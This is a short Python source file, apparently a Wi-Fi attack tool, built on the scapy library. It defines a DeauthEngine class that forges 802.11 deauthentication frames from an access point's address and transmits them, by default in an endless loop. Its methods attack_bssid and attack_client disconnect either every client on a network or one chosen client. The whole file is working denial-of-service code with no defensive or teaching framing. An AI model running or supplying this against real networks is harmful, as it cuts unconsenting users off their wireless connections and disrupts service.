from scapy.all import *

class DeauthEngine:
    def __init__(self, interface):
        self.interface = interface

    def send_deauth(self, target_mac, bssid, count=None, inter=0.1):
        """
        Sends Deauthentication frames.
        bssid: MAC address of the Access Point
        target_mac: MAC address of the Client (or 'ff:ff:ff:ff:ff:ff' for broadcast)
        """
        dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        
        if count:
            sendp(packet, iface=self.interface, count=count, inter=inter, verbose=False)
        else:
            sendp(packet, iface=self.interface, loop=1, inter=inter, verbose=False)

    def attack_bssid(self, bssid):
        """Broadcast deauth to all clients on a BSSID."""
        self.send_deauth("ff:ff:ff:ff:ff:ff", bssid)

    def attack_client(self, bssid, client_mac):
        """Targeted deauth for a specific client."""
        self.send_deauth(client_mac, bssid)
